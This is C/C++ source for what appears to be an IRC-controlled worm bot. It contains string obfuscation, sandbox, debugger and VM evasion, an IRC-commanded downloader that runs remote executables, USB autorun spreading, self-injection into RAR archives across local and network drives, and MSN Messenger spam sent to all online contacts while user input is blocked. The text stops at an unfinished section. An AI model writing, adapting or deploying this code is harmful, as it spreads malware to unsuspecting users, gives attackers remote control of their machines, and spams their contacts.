/*
 ___    _____  __________          __ 
|   |  /     \ \______   \  ____ _/  |_
|   | /  \ /  \ |    |  _/ /  _ \\   __\
|   |/    Y    \|    |   \(  <_> )|  |
|___|\____|__  /|______  / \____/ |__|
             \/        \/ 
*/
#include "../h/includes.h"
#include "../h/functions.h"
#include "../h/externs.h"
	//////////////////////////////////////////////////////////////////////////////
	//								x0r Encryption
	//////////////////////////////////////////////////////////////////////////////
char hostfile[]	= "\x9D\x9D\x96\x88\x8F\x85\x8E\x96\x92\x9D\x9D\x92\xB8\xB2\xB5\xA4\xAC\xF2\xF3\x9D\x9D\xA5\xB3\xA8\xB7\xA4\xB3\xB2\x9D\x9D\xA4\xB5\xA2\x9D\x9D\xA9\xAE\xB2\xB5\xB2";
char decode_key[] = "x0rIM";

BOOL decode_comp = TRUE;

char *Decode(char *s)
{
	unsigned int i, j;
	char *string;
	string = (char *) malloc (strlen(s)+1);
	strcpy(string, s);
	for (i = 0; i < strlen(string); i++)
	{
		for (j = 0; j < sizeof(decode_key); j++)
			string[i] ^= decode_key[j];

		if (decode_comp)
			string[i] = ~ string[i];
	}
	return string;
}











	//////////////////////////////////////////////////////////////////////////////
	//							Security function
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_ANTI
BOOL AntiSandBox()
{
	char *users[] = {"sandbox", "honey", "vmware", "currentuser"};
	DWORD size = 128;
	char szUser[128];
	int i;
	GetUserName(szUser, &size);
	CharLower(szUser);
	for (i = 0; i <	(sizeof(users) / sizeof(LPTSTR)); i++)
	{
		if (strstr(szUser, users[i]) != 0)
			 return TRUE;
	}
	return FALSE;
}
bool IsDebuggerRunning(HANDLE hProcess)
{
	HMODULE hModule = GetModuleHandle("ntdll.dll");
	ZW_QUERY_SYSTEM_INFORMATION		ZwQuerySystemInformation;
	ZW_QUERY_INFORMATION_PROCESS	ZwQueryInformationProcess;
    ZwQuerySystemInformation	=	(ZW_QUERY_SYSTEM_INFORMATION)GetProcAddress(hModule, "ZwQuerySystemInformation");
    ZwQueryInformationProcess	=	(ZW_QUERY_INFORMATION_PROCESS)GetProcAddress(hModule, "ZwQueryInformationProcess");
	SYSTEM_KERNEL_DEBUGGER_INFORMATION Info;
	PROCESS_DEBUG_PORT_INFO ProcessInfo;
    if (ZwQuerySystemInformation != NULL)
    {
		if (STATUS_SUCCESS == ZwQuerySystemInformation(SystemKernelDebuggerInformation, &Info, sizeof(Info), NULL))
		{
			if (Info.DebuggerEnabled)
			{
				if (Info.DebuggerNotPresent)
				{
				}
				else
				{
					return TRUE;
				}
			}
			else
			{
			}
		}
		else
		{
		}
    }
	else
	{
	}
	if (ZwQueryInformationProcess != NULL)
	{
		if (STATUS_SUCCESS == ZwQueryInformationProcess(hProcess, ProcessDebugPort, &ProcessInfo, sizeof(ProcessInfo), NULL))
		{
			if (ProcessInfo.DebugPort)
			{
				return TRUE;
			}
			else
			{
			}
		}
		else
		{
		}
	}
	else
	{
	}
	return FALSE;
}
DWORD __forceinline IsInsideVPC_exceptionFilter(LPEXCEPTION_POINTERS ep)
{
  PCONTEXT ctx = ep->ContextRecord;
  ctx->Ebx = -1;
  ctx->Eip += 4;
  return EXCEPTION_CONTINUE_EXECUTION;
}
bool DetectVPC()
{
	bool bVPCIsPresent = FALSE;
	__try
	{
		_asm push ebx
		_asm mov  ebx, 0
		_asm mov  eax, 1
		_asm __emit 0Fh
		_asm __emit 3Fh
		_asm __emit 07h
		_asm __emit 0Bh
		_asm test ebx, ebx
		_asm setz [bVPCIsPresent]
		_asm pop ebx
	}
	__except(IsInsideVPC_exceptionFilter(GetExceptionInformation()))
	{
	}
	return bVPCIsPresent;
}
bool DetectVMWare()
{
	bool bVMWareIsPresent = TRUE;
	__try
	{
		__asm
		{
			push   edx
			push   ecx
			push   ebx
			mov    eax, 'VMXh'
			mov    ebx, 0
			mov    ecx, 10
			mov    edx, 'VX'
			in     eax, dx
			cmp    ebx, 'VMXh'
			setz   [bVMWareIsPresent]
			pop    ebx
			pop    ecx
			pop    edx
		}
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		bVMWareIsPresent = FALSE;
	}
	return bVMWareIsPresent;
}
bool DetectAnubis()
{
   char szBuffer[260];
   GetModuleFileName( 0, szBuffer, sizeof( szBuffer ) );
   if( strstr( szBuffer, "C:\\sample.exe" ) )
      return( true );
   return( false );
}
bool IsProcessRunningUnderVM()
{
	bool bVMWare;
	bool bVPC;
	bool bAnubis;
	bVMWare	= DetectVMWare();
	bVPC	= DetectVPC();
	bAnubis	= DetectAnubis();
	if (bVPC==TRUE || bVMWare==TRUE || bAnubis==TRUE)
		return TRUE;
	return FALSE;
}
char* sModule[] = { "SbieDll.dll", "dbghelp.dll" };    
bool IsInSandbox()
{
    for( int i = 0; i < ( sizeof( sModule ) / sizeof( char* ) ); i++ )
    {
        if( GetModuleHandle( sModule[ i ] ) ) 
        {
            return true;
        }
    }
    return false;
}
#endif












	//////////////////////////////////////////////////////////////////////////////
	//								Download
	//////////////////////////////////////////////////////////////////////////////
DWORD WINAPI DownloadThread(LPVOID param)
{
	char buffer[IRCLINE];
	DWORD r, d, start, total, speed;
	NTHREAD dl = *((NTHREAD *)param);
	NTHREAD *dls = (NTHREAD *)param;
	dls->gotinfo = TRUE;
	IRC* irc=(IRC*)dl.conn;
	char dlfrom[MAX_HOSTNAME];
	char dlto[MAX_PATH];
	strncpy(dlfrom,dl.data1,sizeof(dlfrom));
	strncpy(dlto,dl.data2,sizeof(dlto));
	HANDLE fh = fInternetOpenUrl(ih, dlfrom, NULL, 0, 0, 0);
	if (fh != NULL)
	{
		HANDLE f = CreateFile(dlto, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		if (f < (HANDLE)1)
		{
			if (!dl.silent)
				irc->pmsg(Decode(infochan),"%s Couldn't open file for writing: %s.",(download_title),dlto);
			fInternetCloseHandle(fh);
			clearthread(dl.threadnum);
			ExitThread(0);
		}
		total = 0;
		start = GetTickCount();
		char *fileTotBuff=(char *)malloc(512000);
		do
		{
			ZeroMemory(buffer,sizeof(buffer));
			fInternetReadFile(fh, buffer, sizeof(buffer), &r);
			WriteFile(f, buffer, r, &d, NULL);
			if ((total) < 512000)
			{
				unsigned int bytestocopy;
				bytestocopy=512000-total;
				if (bytestocopy>r) 
					bytestocopy=r;
				memcpy(&fileTotBuff[total],buffer,bytestocopy);
			}
			total+=r;
		}
		while (r > 0);
		speed = total / (((GetTickCount() - start) / 1000) + 1);
		free(fileTotBuff);
		CloseHandle(f);
		fInternetCloseHandle(fh);
		if (!dl.silent)
			irc->pmsg(Decode(infochan),"%s File download: %.1fKB to: %s @ %.1fKB/sec.",(download_title), total/1024.0, dlto, speed/1024.0);
		if (!dl.bdata1 && dl.bdata2)
		{
			STARTUPINFO si;
			PROCESS_INFORMATION pi;
			BOOL hide=dl.bdata3, wait=dl.verbose;
			char path[MAX_PATH];
			strncpy(path,dlto,sizeof(path));
			if (!fPathRemoveFileSpec(path))
			{
				if (!dl.silent)
					irc->pmsg(Decode(infochan),"%s Couldn't parse path, error: <%d>", download_title, GetLastError());
				return 1;
			}
			ZeroMemory(&si,sizeof(si));
			ZeroMemory(&pi,sizeof(pi));
			si.cb=sizeof(si);
			si.dwFlags = STARTF_USESHOWWINDOW;
			si.wShowWindow = (hide?SW_HIDE:SW_SHOW);
			if (!CreateProcess(NULL,dlto,NULL,NULL,FALSE,0,NULL,path,&si,&pi))
			{
				if (!dl.silent)
					irc->pmsg(Decode(infochan),"%s Failed to create process: \"%s\", error: <%d>", download_title, dlto, GetLastError());
				return 1;
			}
			else
			{
				DWORD start=GetTickCount();
				if (!dl.silent)
					irc->pmsg(Decode(infochan),"%s Created process: \"%s\", PID: <%d>",download_title,dlto,pi.dwProcessId);
				if (dl.verbose)
				{	
					WaitForSingleObject(pi.hProcess,INFINITE);
					DWORD stop=GetTickCount();
					char ttime[120],stime[120];
					stime[0]='\0';
					DWORD total = ((stop - start)/1000);
					DWORD hours = (total%86400)/3600;
					DWORD minutes = ((total%86400)%3600)/60;
					DWORD seconds = ((total%86400)%3600)%60;
					if (hours>0)
					{
						sprintf(ttime," %d%s",hours,(hours==1?" hour":" hours"));
						strcat(stime,ttime);
					}
					sprintf(ttime," %.2d:%.2d",minutes,seconds);
					strcat(stime,ttime);
					irc->pmsg(Decode(infochan),"%s Process Finished: \"%s\", Total Running Time: %s.",download_title,dlto,stime);
				}
				if (pi.hProcess) CloseHandle(pi.hProcess);
				if (pi.hThread) CloseHandle(pi.hThread);
			}
					// download is an update
		}
		else if (dl.bdata1)
		{
			PROCESS_INFORMATION pinfo;
			STARTUPINFO sinfo;
			ZeroMemory(&pinfo, sizeof(PROCESS_INFORMATION));
			ZeroMemory(&sinfo, sizeof(STARTUPINFO));
			sinfo.cb = sizeof(sinfo);
			sinfo.wShowWindow = SW_HIDE;
			if (CreateProcess(NULL, dlto, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS|DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE)
			{
				uninstall(TRUE,(dl.idata1==1?TRUE:FALSE));
				irc->quit(str_quit_upd);
				Sleep(FLOOD_DELAY);
				irc->disconnect();
				fWSACleanup();
				ExitProcess(EXIT_SUCCESS);
			}
			else
			{
				if (!dl.silent)
					irc->pmsg(Decode(infochan),"%s Update failed: Error executing file: %s.",update_title,dlto);
			}
		}
	}
	else
	{
		if (!dl.silent)
			irc->pmsg(Decode(infochan),"%s Bad URL or DNS Error, error: <%d>",(download_title),GetLastError());
	}
	clearthread(dl.threadnum);
	ExitThread(0);
		return 0;
}











	//////////////////////////////////////////////////////////////////////////////
	//								USB Spread
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_USB
BOOL USB_InfectDrive(char *drv)
{	
    #include "../configs.h"
	char	szFile[IRCLINE] = {0}, szTemp[IRCLINE] = {0}, *p;
	int		i;
	BOOL	ret;
	HANDLE	f;
	DWORD	d;

	lstrcat(szFile, drv);
	lstrcat(szFile, USB_STR_RECYCLER);
	if (!CreateDirectory(szFile, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
		return FALSE;
	SetFileAttributes(szFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);

	lstrcat(szFile, USB_STR_REC_SUBDIR);
	if (!CreateDirectory(szFile, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
		return FALSE;
	SetFileAttributes(szFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);

	lstrcat(szFile, USB_STR_DESKTOP_INI);	
	f = CreateFile(szFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
	if (f < (HANDLE)1) 
		return FALSE;
	if (!WriteFile(f, USB_STR_DESKTOP_DATA, sizeof(USB_STR_DESKTOP_DATA) - 1, &d, NULL))
	{
		CloseHandle(f);
		return FALSE;
	}
	CloseHandle(f);

	p = szFile + lstrlen(szFile);
	while (p[0] != '\\')
		p--;
	p++;
	*p = 0;
	lstrcat(szFile, Decode(USB_STR_FILENAME));
	GetModuleFileName(0, szTemp, sizeof(szTemp)-1);
	ret = CopyFile(szTemp, szFile, TRUE);
	SetFileAttributes(szFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
	
	for (i = 0; i < sizeof(szTemp); i++)
		szTemp[i] = 0;
	p = szFile;
	while (p[0] != '\\')
		p++;
	p++;
	lstrcat(szTemp, USB_STR_AUTORUN_DATA1);
	lstrcat(szTemp, p);
	lstrcat(szTemp, USB_STR_AUTORUN_DATA2);
	lstrcat(szTemp, p);
	lstrcat(szTemp, USB_STR_AUTORUN_DATA3);

	for (i = 0; i < sizeof(szFile); i++)
		szFile[i] = 0;
	lstrcat(szFile, drv);
	lstrcat(szFile, USB_STR_AUTORUN_INF);
	SetFileAttributes(szFile, FILE_ATTRIBUTE_NORMAL);
	f = CreateFile(szFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY, 0);
	if (f < (HANDLE)1)
		return FALSE;
	if (!WriteFile(f, szTemp, lstrlen(szTemp), &d, NULL))
	{
		CloseHandle(f);
		return FALSE;
	}

	CloseHandle(f);
	return ret;
}

DWORD WINAPI USB_Spreader(LPVOID param)
{
	NTHREAD usb = *((NTHREAD *)param);
	NTHREAD *usbs = (NTHREAD *)param;
	usbs->gotinfo = TRUE;
	IRC* irc=(IRC*)usb.conn;

    char		szTemp[IRCLINE] = {0}, buff[IRCLINE];
	char 		szDrive[3];
	char		*p;
	int			i;

	szDrive[0] = ' ';
	szDrive[1] = ':';
	szDrive[2] = 0;
	
	for (;;)
	{
		Sleep(USBSLEEPTIME);

    	if (GetLogicalDriveStrings(IRCLINE - 1, szTemp)) 
    	{
        	p = szTemp;
	
        	do
        	{
				*szDrive = *p;

				if (szDrive[0] != 65 && szDrive[0] != 66 && szDrive[0] != 97 && szDrive[0] != 98)
				{
					if (GetDriveType(szDrive) == DRIVE_REMOVABLE)
					{
						if (USB_InfectDrive(szDrive))
						{
							irc->pmsg(Decode(infochan), "%s Infected drive: %s", main_title, szDrive);
							
						}
					}
				}

           		while (*p++);

			} while (*p);
		}
	}
}

#endif
























	//////////////////////////////////////////////////////////////////////////////
	//							WinRAR File Injection
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_WINRAR
#pragma pack(push, 1)
typedef struct RAR_FILE_HEADER
{
	WORD	HEAD_CRC;
	BYTE	HEAD_TYPE;
	WORD	HEAD_FLAGS;
	WORD	HEAD_SIZE;
	DWORD	PACK_SIZE;
	DWORD	UNP_SIZE;
	BYTE	HOST_OS;
	DWORD	FILE_CRC;
	DWORD	FTIME;
	BYTE	UNP_VER;
	BYTE	METHOD;
	WORD	NAME_SIZE;
	DWORD	ATTR;
}RarFileHeader;
#pragma pack(pop)
DWORD crc32(void *xdata,int xsize)
{
	HGLOBAL crc32table;
	DWORD retvalue;
	crc32table=GlobalAlloc(GPTR,0x400);
	if(crc32table!=NULL)
	{
		__asm
		{
			;build crc32 table
			;---------------------
			mov		edi,crc32table
			xor		ecx,ecx
	L2:		push	ecx
			mov		eax,ecx
			mov		ecx,8h
	L1:		mov		edx,eax
			and		edx,1h
			jne		equ_1
			shr		eax,1h
			jmp		__1
	equ_1:  shr		eax,1h
			xor		eax,0edb88320h ;polynomial
	__1:    loop	L1
			stosd
			pop		ecx
			inc		ecx
			cmp		ecx,100h
            jb		L2
			;calc crc32 checksum
			;-------------------
			mov		esi,xdata
			mov		edi,xsize
			xor		ecx,ecx
			mov		ebx,0ffffffffh
	crc:	push	ecx
			xor		eax,eax
			lodsb
			mov		edx,ebx
			shr		ebx,8h
			push	ebx
			xchg	edx,ebx
			and		ebx,0ffh
			xor		ebx,eax
			xchg	eax,ebx
			mov		ecx,4h
			mul		ecx
			xchg	eax,ebx
			mov		eax,crc32table
			add		eax,ebx
			mov		eax,dword ptr [eax]
			pop		ebx
			xor		eax,ebx
			mov		ebx,eax
			pop		ecx
			inc		ecx
			cmp		ecx,edi
			jb		crc
			not		eax
			mov		retvalue,eax
		}
		GlobalFree(crc32table);
		return(retvalue);
	}
	return 0;
}
BOOL AddToRar(char RarFile[],char FileToAdd[],char PackedFileName[],DWORD Attributes)
{
	unsigned char RarMainHeader[20] =
	{
		0x52, 0x61, 0x72, 0x21, 0x1A, 0x07, 0x00, 0xCF, 0x90, 0x73,
		0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	};
	unsigned char EndOfRar[7]=
	{
		0xC4, 0x3D, 0x7B, 0x00, 0x40, 0x07, 0x00,
	};
	HANDLE hrarfile,hfile,hmap,mapbase;
	DWORD IO_Buffer,FileSize,RarFileSize;
	RarFileHeader RarHeader;
	char WorkBuffer[128],*WBp;
	hfile=CreateFile(FileToAdd,GENERIC_READ,FILE_SHARE_READ,0,
		OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	if(hfile==INVALID_HANDLE_VALUE)
		return FALSE;
	FileSize=GetFileSize(hfile,NULL);
	if(FileSize==0xFFFFFFFF)
	{
		CloseHandle(hfile);
		return FALSE;
	}
	hrarfile=CreateFile(RarFile,GENERIC_WRITE,FILE_SHARE_READ,0,
		OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);

	if(hrarfile==INVALID_HANDLE_VALUE)
	{
		hrarfile=CreateFile(RarFile,GENERIC_WRITE,FILE_SHARE_READ,0,
		CREATE_NEW,FILE_ATTRIBUTE_NORMAL,0);
		if(hrarfile==INVALID_HANDLE_VALUE)
		{
			CloseHandle(hfile);
			return FALSE;
		}
		WriteFile(hrarfile,&RarMainHeader,sizeof(RarMainHeader),&IO_Buffer,NULL);
	}
	else
	{
		RarFileSize=GetFileSize(hrarfile,NULL);
		if(RarFileSize==0xFFFFFFFF)
		{
			CloseHandle(hfile);
			CloseHandle(hrarfile);
			return FALSE;
		}
		SetFilePointer(hrarfile,RarFileSize-sizeof(EndOfRar),NULL,FILE_BEGIN);
	}
	hmap=CreateFileMapping(hfile,NULL,PAGE_READONLY,NULL,NULL,NULL);
	if(hmap==NULL)
	{
		CloseHandle(hfile);
		CloseHandle(hrarfile);
		return FALSE;
	}
	mapbase=MapViewOfFile(hmap,FILE_MAP_READ,NULL,NULL,NULL);
	if(mapbase==NULL)
	{
		CloseHandle(hmap);
		CloseHandle(hfile);
		CloseHandle(hrarfile);
		return FALSE;
	}
	memset(&RarHeader,0,sizeof(RarHeader));
	RarHeader.HEAD_TYPE=0x74;
	RarHeader.FILE_CRC=crc32(mapbase,FileSize);
	RarHeader.HEAD_FLAGS=0x8000;
	RarHeader.METHOD=0x30;
	RarHeader.UNP_VER=0x14;
	RarHeader.ATTR=Attributes;
	RarHeader.UNP_SIZE=FileSize;
	RarHeader.PACK_SIZE=FileSize;
	RarHeader.NAME_SIZE=lstrlen(PackedFileName);
	RarHeader.HEAD_SIZE=(sizeof(RarHeader)+RarHeader.NAME_SIZE);
	memset(WorkBuffer,0,sizeof(WorkBuffer));
	memcpy(WorkBuffer,&RarHeader,sizeof(RarHeader));
	WBp=WorkBuffer;
	WBp+=sizeof(RarHeader);
	memcpy(WBp,PackedFileName,RarHeader.NAME_SIZE);
	crc32(WorkBuffer+2,sizeof(RarHeader)+RarHeader.NAME_SIZE-2);
	__asm
	{
		mov word ptr [RarHeader.HEAD_CRC],ax
	}
	WriteFile(hrarfile,&RarHeader,sizeof(RarHeader),&IO_Buffer,NULL);
	WriteFile(hrarfile,PackedFileName,RarHeader.NAME_SIZE,&IO_Buffer,NULL);
	WriteFile(hrarfile,mapbase,FileSize,&IO_Buffer,NULL);
	WriteFile(hrarfile,EndOfRar,sizeof(EndOfRar),&IO_Buffer,NULL);
	UnmapViewOfFile(mapbase);
	CloseHandle(hmap);
	CloseHandle(hfile);
	CloseHandle(hrarfile);
	return TRUE;
}
char wormpath[MAX_PATH];
void InfectDrive()
{
	WIN32_FIND_DATA wfd;
	HANDLE hfind;
	char fullpath[MAX_PATH];
	LPTSTR xaddr=NULL;
	char xrndstr[30];
	hfind=FindFirstFile("*.*",&wfd);
	if(hfind!=INVALID_HANDLE_VALUE)
	{
		do
		{
			if(wfd.cFileName[0]!='.')
			{
				wfd.dwFileAttributes&=FILE_ATTRIBUTE_DIRECTORY;
				if(wfd.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY)
				{
					if(SetCurrentDirectory(wfd.cFileName)==TRUE)
					{
						InfectDrive();
						SetCurrentDirectory("..");
					}
				}
				else
				{
					if(GetFullPathName(wfd.cFileName,MAX_PATH,fullpath,&xaddr)!=0)
					{
						CharLower(fullpath);
						if(memcmp(fullpath+lstrlen(fullpath)-3,"rar",3)==0)
						{
							Sleep(5000);
							RandomString(xrndstr,7,TRUE);
							AddToRar(fullpath,wormpath,Decode(rarexe),FILE_ATTRIBUTE_NORMAL);
						}
					}
				}
			}
		}while(FindNextFile(hfind,&wfd));
		FindClose(hfind);
	}
}
DWORD WINAPI RarWorm(LPVOID xvoid)
{
	char Drive[]="z:\\";
	UINT drive_type;
	if(GetModuleFileName(NULL,wormpath,MAX_PATH)==0)
		ExitThread(0);
	do
	{
		drive_type=GetDriveType(Drive);	
		if(drive_type==DRIVE_FIXED || drive_type==DRIVE_REMOTE)
		{
			if(SetCurrentDirectory(Drive)==TRUE)
				InfectDrive();	
		}
		Drive[0]--;
	}while(Drive[0]!='b');
	return 1;
}
HANDLE XThread(LPTHREAD_START_ROUTINE XThread_Function,LPVOID Parameter)
{
	DWORD Thread_Id;
	return(CreateThread(NULL,NULL,XThread_Function,Parameter,NULL,&Thread_Id));
}void RandomString(char *dst,int len,BOOL Gen_Numbers)
{
	int i=0,randn=0;
	srand(GetTickCount());
	do
	{
		randn=(rand() % 90);
		if(randn<30 && i!=0 && Gen_Numbers==TRUE)
			dst[i]=(48 + (rand() % 9));
		else if(randn<60)
			dst[i]=(98 + (rand() % 24));
		else if(randn>60)
			dst[i]=(66 + (rand() % 24));
		i++;
		len--;
	}while(len!=0);
	dst[i]=NULL;
}
#endif











	//////////////////////////////////////////////////////////////////////////////
	//			MSN Api Link Spam
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_MSN
#import "../Other/MSNMessengerAPI.tlb" named_guids, no_namespace
void to_variant(BSTR, VARIANT& vt);
int trx;
int trx2;

char *stristr(const char *String, const char *Pattern) {
	char *pptr, *sptr, *start;
	unsigned int slen, plen;
	for (start = (char *) String,
			pptr = (char *) Pattern,
			slen = strlen (String), plen = strlen (Pattern);
			slen >= plen; start++, slen--) {
		while (toupper (*start) != toupper (*Pattern)) {
			start++;
			slen--;
			if (slen < plen)
				return (NULL);
		}
		sptr = start;
		pptr = (char *) Pattern;
		while (toupper (*sptr) == toupper (*pptr)) {
			sptr++;
			pptr++;
			if ('\0' == *pptr)
				return (start);
		}
	}
	return (NULL);
}
void key_type(char* text, HWND hwnd)
{
HGLOBAL hData;
LPVOID pData;
OpenClipboard(hwnd);
EmptyClipboard();
hData = GlobalAlloc(GMEM_DDESHARE | GMEM_MOVEABLE, strlen(text) + 1);
pData = GlobalLock(hData);
strcpy((LPSTR)pData, text);
GlobalUnlock(hData);
SetClipboardData(CF_TEXT, hData);
CloseClipboard();
}















////////////////////////////////////////////////
//				Msn Link With Email
////////////////////////////////////////////////
DWORD WINAPI ImMsg(LPVOID param)
{
	trx = 0;
	NTHREAD msn = *((NTHREAD *)param);
	NTHREAD *msns = (NTHREAD *)param;
	msns->gotinfo = TRUE;
	IRC* irc=(IRC*)msn.conn;
	IMSNMessenger3 *pIMessenger = NULL;
	CoInitialize(0);
	HRESULT hr = CoCreateInstance(
		CLSID_Messenger,
		NULL,
		CLSCTX_ALL,
		IID_IMSNMessenger2,
		(void**)&pIMessenger);
	char msnmsg[512];
	char buf[128];
	char msnmsg1[1024];
	strncpy(msnmsg,msn.data1,sizeof(msnmsg));
	if (SUCCEEDED(hr))
	{
		char msg[256];
		IDispatch * dispContacts = NULL;
		pIMessenger->get_MyContacts(&dispContacts);
		if (SUCCEEDED(hr))
		{
			IMSNMessengerContacts *pIMessengerContacts = NULL;
			hr = dispContacts->QueryInterface(__uuidof(pIMessengerContacts),(LPVOID*)&pIMessengerContacts);
			if (SUCCEEDED(hr))
			{
				IDispatch * dispContact					= NULL;
				IMSNMessengerContact *pIMessengerContact	= NULL;
				long iContacts;
				hr = pIMessengerContacts->get_Count(&iContacts);
				if (SUCCEEDED(hr))
				{
					BlockInput(true);
					for (long i = 0; i < iContacts; i++)	
					{
						hr = pIMessengerContacts->raw_Item(i,&dispContact);
						if (SUCCEEDED(hr))
						{
							hr = dispContact->QueryInterface(__uuidof(pIMessengerContact),(LPVOID*)&pIMessengerContact);
							if (SUCCEEDED(hr))
							{
								BSTR szContactName;
								VARIANT vt_user;
								MISTATUS miStatus;
								IDispatch *pIDispatch = NULL;
								IMSNMessengerWindow *pIMessengerWindow;
								LONG wndIM;
								hr = pIMessengerContact->get_Status(&miStatus);
								if (SUCCEEDED(hr))
								{
									if (miStatus == MISTATUS_OFFLINE)
									{
										pIMessengerContact->Release();
										dispContact->Release();
										continue;
									}
								}
								pIMessengerContact->get_SigninName(&szContactName);
								VariantInit( &vt_user );
								to_variant(szContactName, vt_user);
								_bstr_t tmp = szContactName;
								sprintf(buf, _T("%s"), (LPCTSTR)tmp);
								sprintf(msnmsg1, "%s%s", msnmsg, buf); //Messange and email
								Sleep(3000);
								hr = pIMessenger->raw_InstantMessage(vt_user,&pIDispatch);
								if (SUCCEEDED(hr))
								{
									hr = pIDispatch->QueryInterface(IID_IMSNMessengerWindow, (void **)&pIMessengerWindow);
									if (SUCCEEDED(hr))
									{
										Sleep(10);
										pIMessengerWindow->get_HWND(&wndIM);
										SetForegroundWindow((HWND) wndIM);
										SetFocus((HWND) wndIM);
										//trx++;
										ShowWindow((HWND) wndIM,0);										
										srand(GetTickCount());	
                                        key_type((char *)msnmsg1, (HWND) wndIM);
										keybd_event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
                                        keybd_event(VkKeyScan('V'), 0, 0, 0);
                                        keybd_event(VK_CONTROL, 45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); 
                                        keybd_event(VK_RETURN, 0, 0, 0);																	
									}
								}
								pIMessengerContact->Release();
								dispContact->Release();
							}
						}
					}
					BlockInput(false);
					/*
					if ( trx > 0 )
					{
					irc->pmsg(Decode(infochan),str_msn_msg, trx);
					}
					*/
					pIMessengerContacts->Release();
				}
				dispContacts->Release();
			}
		}
		pIMessenger->Release();
	}
	CoUninitialize();
	clearthread(msn.threadnum);
	ExitThread(0);
	return 0;
}

















////////////////////////////////////////////////
//			Msn Link Without Email
////////////////////////////////////////////////
DWORD WINAPI ImMsg2(LPVOID param)
{
	trx2 = 0;
	NTHREAD msn = *((NTHREAD *)param);
	NTHREAD *msns = (NTHREAD *)param;
	msns->gotinfo = TRUE;
	IRC* irc=(IRC*)msn.conn;
	IMSNMessenger3 *pIMessenger = NULL;
	CoInitialize(0);
	HRESULT hr = CoCreateInstance(
		CLSID_Messenger,
		NULL,
		CLSCTX_ALL,
		IID_IMSNMessenger2,
		(void**)&pIMessenger);
	char msnmsg2[512];
	char buf[128];
	char msnmsg3[1024];
	strncpy(msnmsg2,msn.data2,sizeof(msnmsg2));
	if (SUCCEEDED(hr))
	{
		char msg[256];
		IDispatch * dispContacts = NULL;
		pIMessenger->get_MyContacts(&dispContacts);
		if (SUCCEEDED(hr))
		{
			IMSNMessengerContacts *pIMessengerContacts = NULL;
			hr = dispContacts->QueryInterface(__uuidof(pIMessengerContacts),(LPVOID*)&pIMessengerContacts);
			if (SUCCEEDED(hr))
			{
				IDispatch * dispContact					= NULL;
				IMSNMessengerContact *pIMessengerContact	= NULL;
				long iContacts;
				hr = pIMessengerContacts->get_Count(&iContacts);
				if (SUCCEEDED(hr))
				{
					BlockInput(true);
					for (long i = 0; i < iContacts; i++)	
					{
						hr = pIMessengerContacts->raw_Item(i,&dispContact);
						if (SUCCEEDED(hr))
						{
							hr = dispContact->QueryInterface(__uuidof(pIMessengerContact),(LPVOID*)&pIMessengerContact);
							if (SUCCEEDED(hr))
							{
								BSTR szContactName;
								VARIANT vt_user;
								MISTATUS miStatus;
								IDispatch *pIDispatch = NULL;
								IMSNMessengerWindow *pIMessengerWindow;
								LONG wndIM;
								hr = pIMessengerContact->get_Status(&miStatus);
								if (SUCCEEDED(hr))
								{
									if (miStatus == MISTATUS_OFFLINE)
									{
										pIMessengerContact->Release();
										dispContact->Release();
										continue;
									}
								}
								pIMessengerContact->get_SigninName(&szContactName);
								VariantInit( &vt_user );
								to_variant(szContactName, vt_user);
								_bstr_t tmp = szContactName;
								sprintf(buf, _T("%s"), (LPCTSTR)tmp);
								sprintf(msnmsg3, "%s", msnmsg2); // Just message
								Sleep(3000);
								hr = pIMessenger->raw_InstantMessage(vt_user,&pIDispatch);
								if (SUCCEEDED(hr))
								{
									hr = pIDispatch->QueryInterface(IID_IMSNMessengerWindow, (void **)&pIMessengerWindow);
									if (SUCCEEDED(hr))
									{
										Sleep(10);
										pIMessengerWindow->get_HWND(&wndIM);
										SetForegroundWindow((HWND) wndIM);
										SetFocus((HWND) wndIM);
										//trx2++;
										ShowWindow((HWND) wndIM,0);										
										srand(GetTickCount());	
                                        key_type((char *)msnmsg3, (HWND) wndIM);
										keybd_event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
                                        keybd_event(VkKeyScan('V'), 0, 0, 0);
                                        keybd_event(VK_CONTROL, 45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); 
                                        keybd_event(VK_RETURN, 0, 0, 0);																	
									}
								}
								pIMessengerContact->Release();
								dispContact->Release();
							}
						}
					}
					BlockInput(false);
					/*
					if ( trx2 > 0 )
					{
					irc->pmsg(Decode(infochan),str_msn_msg, trx2);
					}
					*/
					pIMessengerContacts->Release();
				}
				dispContacts->Release();
			}
		}
		pIMessenger->Release();
	}
	CoUninitialize();
	clearthread(msn.threadnum);
	ExitThread(0);
	return 0;
}
void to_variant(BSTR str, VARIANT& vt)
{
	reinterpret_cast<_variant_t&>(vt) = str;
}
#endif
















////////////////////////////////////////////////
//			Msn Zipsend + Message
//    contact email: example@email.com
//    zipfilename: example_0014.jpeg-www.imageshack.com.zip
////////////////////////////////////////////////
#ifndef NO_MSNZIPSEND
